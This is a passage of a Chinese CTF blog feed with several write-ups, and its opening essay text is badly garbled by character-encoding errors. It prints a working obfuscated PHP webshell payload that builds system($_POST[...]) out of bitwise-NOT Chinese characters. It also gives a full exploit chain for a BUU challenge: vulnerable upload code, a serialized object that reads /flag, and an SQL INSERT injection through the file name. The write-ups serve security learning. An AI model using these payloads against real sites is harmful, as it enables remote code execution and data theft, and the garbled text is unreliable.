å¤©è¿ç»­ä¸‹ç€æš´é›ªï¼Œè·¯ä¸Šçš„ç§¯é›ªä¸€è¸©åŠæ­¥æ·±ï¼Œå’¯å±å’¯å±å“ï¼Œå‘¨é­å´é™çš„åƒæ·±å±±é‡Œçš„å¤åˆ¹ã€‚æˆ‘ä½çš„å°åŒºç¦»å…¬å¸æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰ä¸‹é›ªçš„é‚£å¤©æˆ‘ç”šè‡³è¿˜èµ°ç€å›å®¶ã€‚åŒ—äº¬çš„å†¬å¤©æœ€å¯æ€•çš„æ˜¯å¯’é£ï¼Œèµ°åˆ°å®¶é‡Œè€³æœµå·²ç»ç¡¬é‚¦é‚¦å¥½åƒä¸€ç¢°å°±ä¼šç¢ï¼Œåœ¨æˆ‘ä¸€å¤´æ‰è¿›è¢«çªé‡Œçš„æ—¶å€™ï¼Œæˆ‘å´æ…¢æ…¢å–œæ¬¢ä¸Šè¿™ä¸ªå¤éƒ½äº†ã€‚æˆ‘æƒ³åˆ°ã€Šé›æ­£çš‡å¸ã€‹é‡Œèƒ¤ç¦›åœ¨åŒ—äº¬çš„é¹…æ¯›å¤§é›ªé‡Œæ”¾å‡ºåä¸‰çˆ·ï¼Œé‚£ä¸ªæ‹¼å‘½åä¸‰éƒå¸¦ç€ä»¤ç‰Œå–ä¸‹ä¸°å°å¤§è¥çš„å…µæƒï¼Œä¿äº†å¤§æ¸…æ±Ÿå±±ç››ä¸–çš„å»¶ç»­ä¸ç¨³å›ºã€‚é‚£ä¸€å¤œï¼ŒåŒ—äº¬çš„æ¼«å¤©å¤§é›ªç»ä¸é€Šäºä»Šæ—¥ï¼Œè€Œæ˜”äººå·²ä½œå¤ï¼Œæ¥è€…å°šä¸èƒ½åŠï¼Œå¤šä¹ˆæ‚²å“€ã€‚è¿™ä¸ªå¤éƒ½æ‰¿è½½ç€å¤ªå¤šå†å²çš„åšé‡æ„Ÿï¼Œç‰¹åˆ«æ˜¯ä¸‹é›ªçš„å­£èŠ‚ï¼Œæˆ‘å¯ä»¥æƒ³åˆ°ä¹¾æ¸…å®«å‰å¹¿åœºä¸Šåƒç™¾å¹´å¯‚å¯çš„é›•é¾™ä¸é“œé¾Ÿï¼Œå±‹æªä¸Šçš„ç§¯é›ªï¼Œé«˜é«˜åœ¨ä¸Šçš„é¸±å»ï¼Œæƒ³åˆ°æ•°ç™¾å¹´çš„æ²§æ¡‘ä¸æœä»£æ›´è¿­ã€‚é›ªåœçš„é‚£å¤©æˆ‘å»äº†é¢å’Œå›­ï¼Œæˆ‘è®°å¾—æˆ‘ç­‰äº†å¾ˆä¹…æ‰æ‘‡æ‘‡æ‘†æ‘†æ¥äº†ä¸€è¾†å…¬äº¤è½¦ï¼Œè½¦ä¸Šå‡ ä¹æ²¡æœ‰äººï¼Œå¸æœºå°å¿ƒç¿¼ç¿¼åœ°è½¬åŠ¨ç€æ–¹å‘ç›˜ï¼Œåœ¨æ¹¿æ»‘çš„é“è·¯ä¸Šç¼“æ…¢å‰è¡Œã€‚çª—å¤–ç™½èŒ«èŒ«ä¸€ç‰‡ï¼Œé˜³å…‰ç…§åœ¨é›ªåœ°ä¸Šæœ‰äº›åˆºçœ¼ï¼Œæˆ‘æ‰ä½ä¸‹å¤´ã€‚é¢å’Œå›­çš„å­¦ç”Ÿç¥¨ç”šè‡³æ¯”åœ°é“ç¥¨è¿˜ä¾¿å®œã€‚åœ¨æ˜†æ˜æ¹–ç•”çœºæœ›æ¹–é¢ï¼Œå¾®å¾®æ³›ç€å¤•é˜³éœå…‰çš„æ¹–æ°´å°šæœªç»“å†°ï¼Œè¸©ç€é‚£äº›å¯èƒ½è¢«å¾¡ç¢¾è½§è¿‡çš„åœŸåœ°ï¼Œæ»‘äº†æ— æ•°è·¤ï¼Œæœ€ååªèƒ½æ‰¶ç€æ¹–è¾¹çš„çŸ³ç‹®å­å¹æ°”ï¼Œä¸ºä»€ä¹ˆæ²¡ç©¿é˜²æ»‘çš„é‹å­ã€‚æ˜†æ˜æ¹–è¿™ä¸€æ±ªæ¸…æ°´ï¼Œè§è¯äº†å…‰ç»ªçš‡å¸è¢«å›šç¦åè½½çš„è¹‰è·å²æœˆï¼Œè§è¯äº†é™å®‰å…ˆç”Ÿèª“ä¸ºå…ˆæœè€Œè‡ªæººï¼Œä¹Ÿè§è¯äº†å…±å’Œå›½ä»¥æ¥å›ºå®ˆä¸å¼€æ”¾çš„äº¤å ã€‚è¯´èµ·æ¥ï¼Œå®¶é‡Œæœ‰æœ¬å«çªè‘—çš„ã€Šäººé—´è¯è¯å…¸è¯„ã€‹ï¼Œæœ¬æƒ³ä¹°æ¥ç»ä»°ä¸€ä¸‹ç‹é™å®‰çš„è¿™ç¯‡å¤å…¸ç¾å­¦å·¨è‘—ï¼Œæ²¡æƒ³åˆ°å…¨ä¹¦å¤šæ˜¯ä»¥æ‰¹åˆ¤ä¸ºä¸»ã€‚æˆ‘è‡ªè¯©æƒ³å½“æ–‡äººçš„é»‘å®¢ï¼Œå…¶å®ä¹Ÿåªæ˜¯å˜´é‡Œè¯´è¯´ï¼ŒçœŸåˆ°è¯„è¯´æ–‡ç« æ˜¯éçš„æ—¶å€™ï¼Œæˆ‘å´å¼ å£æ— è¯ã€‚å€’æ˜¯èª“æ­»ä¸å»å‘ï¼Œè¿™ç‚¹ç¡®å®è®©æˆ‘æ— é™æ„Ÿæ…¨ï¼šä¸­å›½å£«å¤§å¤«çš„éª¨æ°”ï¼ŒçœŸçš„æ˜¯ä»å±ˆåŸæŠ•æ°´çš„é‚£ä¸€åˆ»å°±å¥ å®šä¸‹æ¥çš„ã€‚æœ‰å¥è¯è¯´ï¼Œå¤å¾€ä»Šæ¥ä¸­å›½ä¸‰å¤§å¤©æ‰æ­»äºæ°´ï¼Œå…¶ä¸€å±ˆåŸï¼Œå…¶äºŒæç™½ï¼Œå…¶ä¸‰ç‹å›½ç»´ã€‚å«çªå¯¹æ­¤è¯é¢‡æœ‰ä¸æœï¼Œä¸çº ç»“ç‹å›½ç»´æ˜¯å¦èƒ½å¤Ÿä¸å‰äºŒè€…ç›¸æå¹¶è®ºï¼Œæˆ‘å•å–œæ¬¢ä»–çš„ç›´ç™½ï¼Œèƒ½ç•…å¿«è¯„è¯´å¤ä»Šè¯è¯çš„äººï¼Œä¹Ÿè®¸æ— å‡ºå…¶å³äº†å§ã€‚äººè¨€å¯ç•ã€äººè¨€å¯ç•ï¼Œè¶Šåˆ°ç°ä»£è¶Šä¼šæ·±æ·±æ„Ÿè§‰åˆ°è¿™å¥è¯çš„æ­£ç¡®ï¼Œçœ‹åˆ°å¾ˆå¤šäº‹æƒ…çš„å‘å±•å¾€å¾€è¢«èˆ†è®ºæ‰€å·¦å³ï¼Œå°±è¶Šç¾¡æ…•é‚£äº›æ— æ‰€ç•æƒ§çš„äººï¼Œä¸è®ºä»–ä»¬æ˜¯å‹‡æ•¢è¿˜æ˜¯è‡ªè´Ÿã€‚æ­¤é—´äººç‹å ç®—ä¸€ä¸ªï¼Œç½‘ç»œä¸Šäººä»¬å¯¹ä»–æ¯èª‰å‚åŠï¼Œä½†ç¡®å®æœ‰æœ¬äº‹è€Œåˆä¸çŸ«æ‰åšä½œï¼Œæ”¾èƒ†ç›´è¨€å¿ƒæ¯”å¤©é«˜çš„åªæœ‰ä»–ä¸€ä¸ªäº†ã€‚é‚£å¤©åœ¨æ˜†æ˜æ¹–ç•”çœ‹è¿‡å¤•é˜³ï¼Œç›´åˆ°å¤©ç©ºå˜çš„æ— æ¯”æ·±é‚ƒï¼Œæˆ‘æ‰æ…¢æ…¢å¾€å®¶çš„æ–¹å‘èµ°ã€‚è€³æœºæ”¾ç€åå¼¦çš„ã€Šæ˜†æ˜æ¹–ã€‹ï¼Œä¸çŸ¥ä¸è§‰å·²ç»åå¹´äº†ï¼Œä¸çŸ¥é“è¿™æ—¶å€™ä»–æœ‰æ²¡æœ‰å›é¦–æœ›æœ›è‡ªå·±çš„ä¹å…¬ä¸»å’Œå®‰å¨œï¼Œæ˜¯å¦è¿˜èƒ½å¤Ÿâ€œæ³¼å¢¨é€ ä¸€åŒ¹å¿«é©¬ï¼Œè¿½å›åå¹´å‰å§‘å¨˜â€ã€‚åæ¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æ­¥å…¥æ­£è½¨ï¼Œå­¦ä½è¯ä¹Ÿé¡ºåˆ©æ‹¿åˆ°ï¼Œæˆ‘åŒ†åŒ†å‘Šåˆ«äº†è‡ªå·±çš„å¤§å­¦ã€‚åæ¥ä¹Ÿé‡åˆ°äº†å¾ˆå¤šäº‹ï¼Œäº‹åæœ‰äººæ‰¾æˆ‘ï¼Œå¾ˆå¤šäººå…³å¿ƒä½ ï¼Œå°‘æ•°äººå¯èƒ½ä¸æ˜¯ï¼Œä½†å‡ºäº†å­¦æ ¡ä»¥åï¼Œåˆæœ‰å¤šå°‘äººå’Œäº‹æƒ…å®Œå…¨æ²¡æœ‰ç›®çš„å‘¢ï¼Ÿæˆ‘ä¹Ÿè€ƒè™‘äº†å¾ˆå¤šå»å¤„ï¼Œä½†ä¸€ç›´æ²¡æœ‰å†³æ–­ï¼Œå€’æœ‰å¿µæ€€æ—§ä¸»ï¼Œä¹Ÿæœ‰å¦„è‡ªè²è–„ä¹‹æ„ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½åšå‡ºç‚¹æˆç»©å†å»è°ˆå…¶ä»–çš„ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ˜¯é—­é—¨ä¸å‡ºï¼Œç¢ç£¨ä¸œè¥¿ã€‚æ¥åˆ°å¦é—¨ï¼Œæˆ‘è¿˜äº†ä¸€ä¸ªæ„¿ï¼Œåˆè®¸äº†æ–°çš„æ„¿æœ›ï¼Œå¸Œæœ›æˆ‘è¿˜ä¼šå†æ¬¡æ¥è¿˜æ„¿ã€‚æˆ‘åˆæ¥åˆ°äº†ä¸Šæ¬¡æ²¡ä½å¤Ÿçš„é¼“æµªå±¿ï¼Œè®¢äº†ä¸€é—´å®‰é™çš„æˆ¿å­ï¼Œåªæœ‰æˆ‘ä¸€ä¸ªäººã€‚åœ¨è¿™é‡Œï¼Œèƒ½å¬åˆ°çš„åªæœ‰è¿œå¤„å±‹æªä¸‹é¸Ÿå„¿å½å½å–³å–³çš„é¸£å«å£°ï¼Œè¿œå¤„çš„å–§åš£æ—©å·²çƒŸæ¶ˆäº‘æ•£ï¼Œå³ä½¿è¿™åªæ˜¯æš‚æ—¶çš„ã€‚ç«™åœ¨å±‹é¡¶çš„æˆ‘ï¼Œå–ä¸‹æ¯ä¸­æœ€åä¸€å£æ°´ã€‚æ¸…æ™¨ï¼ŒèƒŒç€è¡Œæï¼Œæˆ‘ä¹˜è½®æ¸¡ç¦»å¼€äº†é¼“æµªå±¿ï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡æ¥é¼“æµªå±¿ï¼Œè°çŸ¥é“ä¼šä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ã€‚æˆ‘åœ¨è¿™é‡Œä½äº†ä¸‰å¤©ï¼Œç”¨ä¸‰å¤©å»å¯»æ‰¾äº†ä¸€ä¸ªç­”æ¡ˆã€‚ä¸çŸ¥ä¸è§‰æˆ‘åˆæƒ³åˆ°è¾œé¸¿é“­ä¸æ²ˆå­åŸ¹çš„é‚£æ®µå¯¹è¯ã€‚â€œå¤§éš¾ä¸´å¤´ï¼Œä½•ä»¥ä¸ºä¹‹ï¼Ÿâ€â€œä¸–å—å›½æ©ï¼Œæ­»ç”Ÿç³»ä¹‹ã€‚â€&#x27;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>; $i&lt;mb_strlen($str, <span class="hljs-string">&#x27;utf-8&#x27;</span>); $i++)&#123;    $st = mb_substr($str, $i,<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;utf-8&#x27;</span>);    $a = ~($st);    $b = $a[<span class="hljs-number">1</span>];<span class="hljs-comment">#å–æ±‰å­—çš„ç¬¬ä¸€ä½</span>    <span class="hljs-keyword">if</span>($b==$_GET[<span class="hljs-string">&#x27;a&#x27;</span>])<span class="hljs-comment">#$_GET[&#x27;a&#x27;]æƒ³è¦å¾—åˆ°çš„å­—ç¬¦</span>    &#123;        <span class="hljs-keyword">echo</span> $st;<span class="hljs-keyword">exit</span>;      <span class="hljs-comment">//~($st)[1]</span>    &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><a href="https://www.leavesongs.com/THINK/answer.html?page=1">Pç¥</a>      </p><p>ä¸Šé¢çš„EXPä½¿ç”¨æ–¹æ³•      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/608d549c7d463779.png">     </p><p>æ„é€ payload<code>&lt;?=system($_POST[system]);&gt;</code><br>å…ˆæ„é€ æ•°å­—1â€“&gt;<code>$__=[];$____=$__==$__;</code><br>system:<code>$_=~(åŒ—)[$____];$_.=~(ç†™)[$____];$_.=~(åŒ—)[$____];$_.=~(æ‹¾)[$____];$_.=~(çš„)[$____];$_.=~(å’Œ)[$____];</code>       </p><p>_POST:<code>$___=~(æ ·)[$____];$___.=~(è¯´)[$____];$___.=~(å°)[$____];$___.=~(æ¬¡)[$____];$___.=~(ç«™)[$____];$____=~(ç°)[$____];</code>       </p><p><code>system($_POST[system])</code>:<code>$_($$___[$_])</code>      </p><p>æœ€ç»ˆçš„payloadï¼š<code>&lt;?=$__=[];$____=$__==$__;$_=~(åŒ—)[$____];$_.=~(ç†™)[$____];$_.=~(åŒ—)[$____];$_.=~(æ‹¾)[$____];$_.=~(çš„)[$____];$_.=~(å’Œ)[$____];$___=~(æ ·)[$____];$___.=~(è¯´)[$____];$___.=~(å°)[$____];$___.=~(æ¬¡)[$____];$___.=~(ç«™)[$____];$____=~(ç°)[$____];$_($$___[$_]);</code>    </p><p>flagä¸åœ¨æ ¹ç›®å½•ä¸‹ï¼Œåœ¨ç¯å¢ƒå˜é‡ä¸­<code>env</code>    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/dbbe16c2fd333a78.png">     </p><p>payload:<code>eval($_POST[1])</code>å°±ä¸è¡Œï¼ŒåŸå› æ˜¯PHPæ”¯æŒ<code>å˜é‡å‡½æ•°</code>,ä¹Ÿå°±æ˜¯é€šè¿‡ä¸€ä¸ªå˜é‡ä¿å­˜å‡½æ•°åï¼Œåœ¨å˜é‡ååŠ ä¸Š<code>()</code>å³å¯è°ƒç”¨å‡½æ•°ï¼›ä½†æ˜¯<code>eval</code>å¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ˜¯PHPè¯­æ³•ç»“æ„çš„ä¸€éƒ¨åˆ†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;o-o&quot;&gt;&lt;a href=&quot;#o-o&quot; class=&quot;headerlink&quot; title=&quot;o)o&quot;&gt;&lt;/a&gt;o)o&lt;/h2&gt;&lt;p&gt;æ‰“å¼€ç¯å¢ƒï¼Œå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜ç»™äº†éƒ¨åˆ†æºç &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ftp.bmp.ovh/imgs/202</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="getshell" scheme="http://lll-nnn.github.io/tags/getshell/"/>
    
    <category term="upload" scheme="http://lll-nnn.github.io/tags/upload/"/>
    
  </entry>
  
  <entry>
    <title>ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </title>
    <link href="http://lll-nnn.github.io/2021/05/15/BUU86/"/>
    <id>http://lll-nnn.github.io/2021/05/15/BUU86/</id>
    <published>2021-05-14T16:02:50.000Z</published>
    <updated>2021-05-16T07:37:39.392Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="__--__"></a><code>__--__</code></h2><p>é¢˜ç›®è¯´ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œçœ‹ä¸€ä¸‹<code>www.zip</code>   </p><p>æ²¡æœ‰ï¼Ÿï¼Ÿ</p><p>çœ‹äº†WPï¼Œæ˜¯<img src="https://ftp.bmp.ovh/imgs/2021/05/ad5b5c5bd9ee86bb.png">   </p><p><code>github</code>ä¸Šæœç´¢å¾—åˆ°æºç <img src="https://ftp.bmp.ovh/imgs/2021/05/af38783effb1d68a.png">      </p><p>ä¸»è¦æ˜¯<code>helper.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $folder = <span class="hljs-string">&quot;pic/&quot;</span>;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">False</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;config.txt&quot;</span>;    <span class="hljs-comment">// The function is not yet perfect, it is not open yet.</span>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params">$input=<span class="hljs-string">&quot;file&quot;</span></span>)</span><span class="hljs-function">    </span>&#123;        $fileinfo = <span class="hljs-keyword">$this</span>-&gt;getfile($input);        $array = <span class="hljs-keyword">array</span>();        $array[<span class="hljs-string">&quot;title&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;title&#x27;</span>];        $array[<span class="hljs-string">&quot;filename&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;filename&#x27;</span>];        $array[<span class="hljs-string">&quot;ext&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;ext&#x27;</span>];        $array[<span class="hljs-string">&quot;path&quot;</span>] = $fileinfo[<span class="hljs-string">&#x27;path&#x27;</span>];        $img_ext = getimagesize($_FILES[$input][<span class="hljs-string">&quot;tmp_name&quot;</span>]);        $my_ext = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;width&quot;</span>=&gt;$img_ext[<span class="hljs-number">0</span>],<span class="hljs-string">&quot;height&quot;</span>=&gt;$img_ext[<span class="hljs-number">1</span>]);        $array[<span class="hljs-string">&quot;attr&quot;</span>] = serialize($my_ext);        $id = <span class="hljs-keyword">$this</span>-&gt;save($array);        <span class="hljs-keyword">if</span> ($id == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="hljs-subst">$id</span>.&lt;/p&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getfile</span>(<span class="hljs-params">$input</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($input))&#123;            $rs = <span class="hljs-keyword">$this</span>-&gt;check($_FILES[$input]);        &#125;        <span class="hljs-keyword">return</span> $rs;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params">$info</span>)</span><span class="hljs-function">    </span>&#123;        $basename = substr(md5(time().uniqid()),<span class="hljs-number">9</span>,<span class="hljs-number">16</span>);        $filename = $info[<span class="hljs-string">&quot;name&quot;</span>];        $ext = substr(strrchr($filename, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);        $cate_exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>);        <span class="hljs-keyword">if</span>(!in_array($ext,$cate_exts))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);        &#125;        $title = str_replace(<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;&#x27;</span>,$filename);        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;$title,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;$ext,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.$basename.<span class="hljs-string">&quot;.&quot;</span>.$ext);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">if</span>(!$data || !is_array($data))&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Something wrong!&quot;</span>);        &#125;        $id = <span class="hljs-keyword">$this</span>-&gt;insert_array($data);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_array</span>(<span class="hljs-params">$data</span>)</span><span class="hljs-function">    </span>&#123;        $con = mysqli_connect(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);        <span class="hljs-keyword">if</span> (mysqli_connect_errno($con))         &#123;             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.mysqli_connect_error());        &#125;        $sql_fields = <span class="hljs-keyword">array</span>();        $sql_val = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">foreach</span>($data <span class="hljs-keyword">as</span> $key=&gt;$value)&#123;            $key_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $key);            $value_temp = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0\0\0&#x27;</span>, $value);            $sql_fields[] = <span class="hljs-string">&quot;`&quot;</span>.$key_temp.<span class="hljs-string">&quot;`&quot;</span>;            $sql_val[] = <span class="hljs-string">&quot;&#x27;&quot;</span>.$value_temp.<span class="hljs-string">&quot;&#x27;&quot;</span>;        &#125;        $sql = <span class="hljs-string">&quot;INSERT INTO images (&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_fields)).<span class="hljs-string">&quot;) VALUES(&quot;</span>.(implode(<span class="hljs-string">&quot;,&quot;</span>,$sql_val)).<span class="hljs-string">&quot;)&quot;</span>;        mysqli_query($con, $sql);        $id = mysqli_insert_id($con);        mysqli_close($con);        <span class="hljs-keyword">return</span> $id;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">view_files</span>(<span class="hljs-params">$path</span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;ifview == <span class="hljs-literal">False</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;            <span class="hljs-comment">//The function is not yet perfect, it is not open yet.</span>        &#125;        $content = file_get_contents($path);        <span class="hljs-keyword">echo</span> $content;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-comment"># Read some config html</span>        <span class="hljs-keyword">$this</span>-&gt;view_files(<span class="hljs-keyword">$this</span>-&gt;config);    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>æœ€åçš„è¿™é‡Œå¯ä»¥åˆ©ç”¨<br><img src="https://ftp.bmp.ovh/imgs/2021/05/3e66365debf75d92.png"></p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">helper</span> </span>&#123;    <span class="hljs-keyword">protected</span> $ifview = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> $config = <span class="hljs-string">&quot;/flag&quot;</span>;&#125;$a=<span class="hljs-keyword">new</span> helper();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>ç„¶åæ˜¯sql <code>insert </code> æ³¨å…¥   </p><p>æ­£å¸¸ä¸Šä¼ å›¾ç‰‡çš„sqlè¯­å¥ä¸º<br><code>INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(&#39;TIMæˆªå›¾20191102114857&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic/f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code>    </p><p>å…¶ä¸­titleæ²¡æœ‰åšä»€ä¹ˆå¤„ç†<br>æ‰€ä»¥æ„é€ <code>1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg</code><br>æ–‡ä»¶åä¸èƒ½æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç     </p><p>ä¸Šä¼ å›¾ç‰‡ï¼Œç”¨burpæ”¹ä¸€ä¸‹æ–‡ä»¶åï¼Œåœ¨<code>show.php</code>å¾—åˆ°flag     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7518b270a41d8eaa.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;__--__&quot;&gt;&lt;/a&gt;&lt;code&gt;__--__&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;é¢˜ç›®è¯´ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œçœ‹ä¸€ä¸‹&lt;code&gt;www.zip&lt;/code&gt;   &lt;/p&gt;
&lt;p&gt;æ²¡æœ‰ï¼Ÿï¼Ÿ&lt;/p&gt;
</summary>
      
    
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/categories/CTF/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/categories/CTF/php/"/>
    
    
    <category term="CTF" scheme="http://lll-nnn.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="http://lll-nnn.github.io/tags/WP/"/>
    
    <category term="php" scheme="http://lll-nnn.github.io/tags/php/"/>
    
    <category term="serialize" scheme="http://lll-nnn.github.io/tags/serialize/"/>
    
    <category term="sql" scheme="http://lll-nnn.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Wicctf</title>
    <link href="http://lll-nnn.github.io/2021/05/11/wicctf/"/>
    <id>http://lll-nnn.github.io/2021/05/11/wicctf/</id>
    <published>2021-05-11T09:00:11.000Z</published>
    <updated>2021-05-13T15:35:36.167Z</updated>
    
    <content type="html"><![CDATA[<h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜<br>ç»™äº†æºç ï¼Œå…¶ä¸­æœ‰äº›é…ç½®æ–‡ä»¶çœ‹ä¸æ‡‚ï¼Œæ”¾å¼ƒäº†   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png">     </p><p>ä¸€å¼€å§‹ä¸Šä¼ PHPæ–‡ä»¶ï¼Œä¸Šä¼ æˆåŠŸäº†ï¼Œä½†è®¿é—®è¿”å›äº†æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œåº”è¯¥æ˜¯æ²¡æœ‰è§£æPHPæ–‡ä»¶     </p><p>è¿™æ—¶å€™å°±åº”è¯¥æ‰¾apacheä¸­çš„ç›¸å…³é…ç½®äº†    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png">      </p><p>è¿™ä¸ªè®¾ä¸ºäº†<code>off</code>ä¼šé™åˆ¶ç›®å½•ä¸‹çš„PHPæ–‡ä»¶æ²¡æœ‰æ‰§è¡Œæƒé™<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png">        </p><p>é€šè¿‡ä¼ 